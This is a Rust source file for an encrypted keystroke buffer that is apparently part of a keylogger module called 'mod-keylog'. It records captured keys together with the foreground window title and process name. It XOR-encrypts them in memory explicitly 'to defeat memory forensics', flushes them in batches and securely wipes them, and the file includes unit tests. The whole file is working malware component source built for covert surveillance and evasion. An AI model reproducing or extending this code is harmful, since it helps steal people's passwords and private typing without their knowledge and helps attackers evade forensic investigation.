//! Encrypted keystroke buffer for mod-keylog
//!
//! Stores captured keystrokes in an XOR-encrypted buffer to defeat memory forensics.
//! Auto-flushes on size threshold or time interval.

use parking_lot::Mutex;
use std::time::{SystemTime, UNIX_EPOCH};

/// A single keystroke entry with window context
#[derive(Debug, Clone)]
pub struct KeystrokeEntry {
    /// Window title when keystroke was captured
    pub window_title: String,
    /// Process name of the foreground window
    pub process_name: String,
    /// The captured keystrokes as a string
    pub keystrokes: String,
    /// Timestamp in milliseconds since epoch
    pub timestamp: u64,
}

/// Configuration for the keystroke buffer
#[derive(Debug, Clone)]
pub struct BufferConfig {
    /// Maximum entries before auto-flush (default: 100)
    pub max_entries: usize,
    /// Maximum total keystroke characters before flush (default: 4096)
    pub max_chars: usize,
    /// Auto-flush interval in seconds (default: 60)
    pub flush_interval_secs: u64,
    /// XOR encryption key for in-memory storage
    pub encryption_key: [u8; 32],
}

impl Default for BufferConfig {
    fn default() -> Self {
        Self {
            max_entries: 100,
            max_chars: 4096,
            flush_interval_secs: 60,
            encryption_key: [0x5A; 32], // Default key, should be randomized
        }
    }
}

/// Thread-safe encrypted keystroke buffer
pub struct KeystrokeBuffer {
    /// Encrypted entries (XOR with key)
    entries: Mutex<Vec<EncryptedEntry>>,
    /// Current entry being built
    current_entry: Mutex<Option<KeystrokeEntry>>,
    /// Buffer configuration
    config: BufferConfig,
    /// Total character count
    total_chars: Mutex<usize>,
    /// Last flush timestamp
    last_flush: Mutex<u64>,
    /// Capture start time
    start_time: u64,
}

/// Encrypted representation of a keystroke entry
struct EncryptedEntry {
    data: Vec<u8>,
}

impl KeystrokeBuffer {
    /// Create a new buffer with the given configuration
    pub fn new(config: BufferConfig) -> Self {
        let now = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .map(|d| d.as_millis() as u64)
            .unwrap_or(0);

        Self {
            entries: Mutex::new(Vec::new()),
            current_entry: Mutex::new(None),
            config,
            total_chars: Mutex::new(0),
            last_flush: Mutex::new(now),
            start_time: now,
        }
    }

    /// Create with default configuration but random key
    pub fn with_random_key() -> Self {
        let mut config = BufferConfig::default();
        // Generate pseudo-random key from system time
        let now = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .map(|d| d.as_nanos())
            .unwrap_or(0);
        for (i, byte) in config.encryption_key.iter_mut().enumerate() {
            *byte = ((now >> (i % 16)) & 0xFF) as u8 ^ (i as u8).wrapping_mul(31);
        }
        Self::new(config)
    }

    /// Add a keystroke to the current window context
    pub fn add_keystroke(&self, ch: char, window_title: &str, process_name: &str) {
        let mut current = self.current_entry.lock();
        let now = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .map(|d| d.as_millis() as u64)
            .unwrap_or(0);

        match current.as_mut() {
            Some(entry) if entry.window_title == window_title => {
                // Same window, append keystroke
                entry.keystrokes.push(ch);
            }
            Some(entry) => {
                // Window changed, finalize current entry and start new one
                let completed = entry.clone();
                self.finalize_entry(completed);

                *current = Some(KeystrokeEntry {
                    window_title: window_title.to_string(),
                    process_name: process_name.to_string(),
                    keystrokes: ch.to_string(),
                    timestamp: now,
                });
            }
            None => {
                // No current entry, start new one
                *current = Some(KeystrokeEntry {
                    window_title: window_title.to_string(),
                    process_name: process_name.to_string(),
                    keystrokes: ch.to_string(),
                    timestamp: now,
                });
            }
        }

        // Update character count
        *self.total_chars.lock() += 1;
    }

    /// Add a special key representation (e.g., [ENTER], [TAB])
    pub fn add_special_key(&self, key_name: &str, window_title: &str, process_name: &str) {
        let formatted = format!("[{}]", key_name);
        for ch in formatted.chars() {
            self.add_keystroke(ch, window_title, process_name);
        }
    }

    /// Finalize current entry and encrypt it
    fn finalize_entry(&self, entry: KeystrokeEntry) {
        if entry.keystrokes.is_empty() {
            return;
        }

        // Serialize entry
        let serialized = format!(
            "{}|{}|{}|{}",
            entry.timestamp, entry.window_title, entry.process_name, entry.keystrokes
        );

        // Encrypt with XOR
        let encrypted = self.xor_encrypt(serialized.as_bytes());

        let mut entries = self.entries.lock();
        entries.push(EncryptedEntry { data: encrypted });
    }

    /// Check if buffer should be flushed
    pub fn should_flush(&self) -> bool {
        let entries = self.entries.lock();
        let total_chars = *self.total_chars.lock();
        let last_flush = *self.last_flush.lock();

        let now = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .map(|d| d.as_millis() as u64)
            .unwrap_or(0);

        entries.len() >= self.config.max_entries
            || total_chars >= self.config.max_chars
            || (now - last_flush) >= (self.config.flush_interval_secs * 1000)
    }

    /// Flush and return all captured keystrokes, clearing the buffer
    pub fn flush(&self) -> Vec<KeystrokeEntry> {
        // First, finalize any current entry
        {
            let mut current = self.current_entry.lock();
            if let Some(entry) = current.take() {
                self.finalize_entry(entry);
            }
        }

        // Drain and decrypt all entries
        let mut entries = self.entries.lock();
        let encrypted_entries: Vec<_> = entries.drain(..).collect();
        drop(entries);

        // Reset counters
        *self.total_chars.lock() = 0;
        *self.last_flush.lock() = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .map(|d| d.as_millis() as u64)
            .unwrap_or(0);

        // Decrypt and parse entries
        encrypted_entries
            .into_iter()
            .filter_map(|enc| self.decrypt_entry(&enc))
            .collect()
    }

    /// Get entry count without flushing
    pub fn entry_count(&self) -> usize {
        self.entries.lock().len()
    }

    /// Get start time
    pub fn start_time(&self) -> u64 {
        self.start_time
    }

    /// XOR encrypt data with the key
    fn xor_encrypt(&self, data: &[u8]) -> Vec<u8> {
        data.iter()
            .enumerate()
            .map(|(i, b)| b ^ self.config.encryption_key[i % 32])
            .collect()
    }

    /// Decrypt and parse an entry
    fn decrypt_entry(&self, encrypted: &EncryptedEntry) -> Option<KeystrokeEntry> {
        // Decrypt
        let decrypted = self.xor_encrypt(&encrypted.data); // XOR is symmetric
        let text = String::from_utf8(decrypted).ok()?;

        // Parse: timestamp|window|process|keystrokes
        let parts: Vec<&str> = text.splitn(4, '|').collect();
        if parts.len() != 4 {
            return None;
        }

        Some(KeystrokeEntry {
            timestamp: parts[0].parse().ok()?,
            window_title: parts[1].to_string(),
            process_name: parts[2].to_string(),
            keystrokes: parts[3].to_string(),
        })
    }

    /// Securely clear the buffer (zero memory)
    pub fn secure_clear(&self) {
        // Clear current entry
        {
            let mut current = self.current_entry.lock();
            if let Some(entry) = current.as_mut() {
                // Overwrite keystrokes with zeros
                unsafe {
                    let ptr = entry.keystrokes.as_mut_ptr();
                    std::ptr::write_bytes(ptr, 0, entry.keystrokes.len());
                }
            }
            *current = None;
        }

        // Clear encrypted entries
        {
            let mut entries = self.entries.lock();
            for entry in entries.iter_mut() {
                for byte in entry.data.iter_mut() {
                    unsafe { std::ptr::write_volatile(byte, 0) };
                }
            }
            entries.clear();
        }

        *self.total_chars.lock() = 0;
    }
}

impl Drop for KeystrokeBuffer {
    fn drop(&mut self) {
        self.secure_clear();
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_buffer_creation() {
        let buffer = KeystrokeBuffer::with_random_key();
        assert_eq!(buffer.entry_count(), 0);
    }

    #[test]
    fn test_add_and_flush() {
        let buffer = KeystrokeBuffer::with_random_key();

        buffer.add_keystroke('H', "Notepad", "notepad.exe");
        buffer.add_keystroke('i', "Notepad", "notepad.exe");
        buffer.add_keystroke('!', "Notepad", "notepad.exe");

        let entries = buffer.flush();
        assert_eq!(entries.len(), 1);
        assert_eq!(entries[0].keystrokes, "Hi!");
        assert_eq!(entries[0].window_title, "Notepad");
    }

    #[test]
    fn test_window_change() {
        let buffer = KeystrokeBuffer::with_random_key();

        buffer.add_keystroke('a', "Window1", "app1.exe");
        buffer.add_keystroke('b', "Window1", "app1.exe");
        buffer.add_keystroke('c', "Window2", "app2.exe"); // Window change
        buffer.add_keystroke('d', "Window2", "app2.exe");

        let entries = buffer.flush();
        assert_eq!(entries.len(), 2);
        assert_eq!(entries[0].keystrokes, "ab");
        assert_eq!(entries[1].keystrokes, "cd");
    }

    #[test]
    fn test_encryption() {
        let config = BufferConfig {
            encryption_key: [0xAA; 32],
            ..Default::default()
        };
        let buffer = KeystrokeBuffer::new(config);

        buffer.add_keystroke('X', "Test", "test.exe");

        // Check that stored data is encrypted (not plaintext)
        let entries = buffer.entries.lock();
        if !entries.is_empty() {
            let raw = &entries[0].data;
            // Should not contain plaintext "Test"
            assert!(!raw.windows(4).any(|w| w == b"Test"));
        }
    }
}
